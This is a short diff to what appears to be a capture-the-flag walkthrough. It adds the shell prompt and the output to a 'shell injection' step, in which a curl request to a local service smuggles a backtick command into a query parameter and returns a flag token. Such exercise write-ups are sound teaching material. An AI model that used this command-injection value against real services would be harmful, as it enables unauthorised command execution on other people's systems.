@@ -14,5 +14,6 @@ x(param("x"));
 
 ## step 2 : shell injection
 ```
-curl localhost:4747/?x=\`getflag\`
+$ curl localhost:4747/?x=\`getflag\`
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
